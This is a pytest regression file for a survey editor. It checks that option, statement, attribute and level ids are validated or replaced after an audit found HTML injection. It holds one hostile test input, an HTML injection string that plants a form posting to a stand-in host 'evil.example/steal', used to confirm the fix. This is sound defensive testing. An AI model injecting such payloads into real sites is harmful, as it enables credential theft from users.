"""Ids from editor forms (options, statements, attributes, levels, loop columns) are checked like the file import
checks them (ID_RE), else replaced by a new id (audit 2026-10-13, XS-1 and XS-2): an attribute id with `"><form …`
went raw into the HTML the conjoint editor builds from its level template, other ids broke the selectors of the
participants' scripts."""
import html as htmllib
import re

import pytest
from werkzeug.datastructures import MultiDict

from app.extensions import db
from app.items.base import ID_RE, form_id, form_ids
from app.models import Item
from tests.conftest import add, fill_consent

E = "/surveys/1/editor"
EVIL = 'a1"><form action="https://evil.example/steal" method="post"><button>OK</button></form><x y="'


def test_form_id_helpers():
    assert form_id("o_1.a-b") == "o_1.a-b"
    assert ID_RE.match(form_id(EVIL)) and ID_RE.match(form_id(None))
    out = form_ids(["ok", "", EVIL, EVIL, 'x"]'])
    assert out[0] == "ok" and out[1] == ""
    assert out[2] == out[3] and ID_RE.match(out[2]) and ID_RE.match(out[4]) and out[2] != out[4]


def test_conjoint_attribute_and_level_ids_are_checked(app, client, survey):
    fill_consent(client)
    add(client, "conjoint")
    rows = [("code", "cbc"), ("question", "Q?"), ("tasks", "4"), ("alternatives", "2"), ("versions", "1"),
            ("display", "table")]
    for aid, code, levels in ((EVIL, "look", ["x", "y"]), ("a2", "price", ["1", "2"])):
        rows += [("attr_id", aid), ("attr_code", code), ("attr_label", code)]
        for n, lv in enumerate(levels):
            lid = EVIL + str(n) if aid == EVIL else f"l{n}{code}"
            rows += [(f"lvl_{aid}_id", lid), (f"lvl_{aid}_label", lv), (f"lvl_{aid}_hint", "")]
    client.post(E + "/items/2", data=MultiDict(rows))
    with app.app_context():
        item = db.session.get(Item, 2)
        attributes = item.config["attributes"]
        assert [a["code"] for a in attributes] == ["look", "price"]
        assert attributes[1]["id"] == "a2"
        for a in attributes:
            assert ID_RE.match(a["id"])
            assert len(a["levels"]) == 2 and all(ID_RE.match(level["id"]) for level in a["levels"])
        labels = item.texts["de"]["levels"] if "de" in (item.texts or {}) else None
        if labels is not None:
            assert {labels[level["id"]] for level in attributes[0]["levels"]} == {"x", "y"}
    page = client.get(E + "/items/2").data.decode()
    assert "evil.example" not in page
    for aid in re.findall(r'data-aid="([^"]*)"', page):
        assert ID_RE.match(htmllib.unescape(aid))


def test_level_template_escapes_the_attribute_id():
    """XS-1, second half: the script escapes data-aid before it goes into the template's HTML."""
    import os

    js = open(os.path.join(os.path.dirname(__file__), "..", "..", "app", "static", "app.js"), encoding="utf-8").read()
    assert 'split("__AID__").join(esc(aid))' in js


@pytest.mark.parametrize("type_, rows", [
    ("single_choice", [("option_id", EVIL), ("option_code", "1"), ("option_label", "A"),
                       ("option_id", "b"), ("option_code", "2"), ("option_label", "B")]),
    ("likert", [("stmt_id", EVIL), ("stmt_code", "s1"), ("stmt_text", "Eins"),
                ("stmt_id", "s2"), ("stmt_code", "s2"), ("stmt_text", "Zwei")]),
    ("maxdiff", [("md_id", EVIL), ("md_text", "Eins"), ("md_id", "m2"), ("md_text", "Zwei"),
                 ("md_id", "m3"), ("md_text", "Drei")]),
    ("semantic", [("pair_id", EVIL), ("pair_code", "p1"), ("pair_left", "kalt"), ("pair_right", "warm")]),
])
def test_row_ids_of_element_editors_are_checked(app, client, survey, type_, rows):
    """XS-2: every id the editor stores matches ID_RE; the valid ones stay as sent."""
    add(client, type_)
    client.post(E + "/items/2", data=MultiDict([("code", "q"), ("question", "Frage?")] + rows))
    with app.app_context():
        config = db.session.get(Item, 2).config
    ids = [entry["id"] for key in ("options", "statements", "pairs") for entry in config.get(key) or []]
    assert len(ids) >= 1
    assert all(ID_RE.match(i) for i in ids), ids
    assert EVIL not in ids
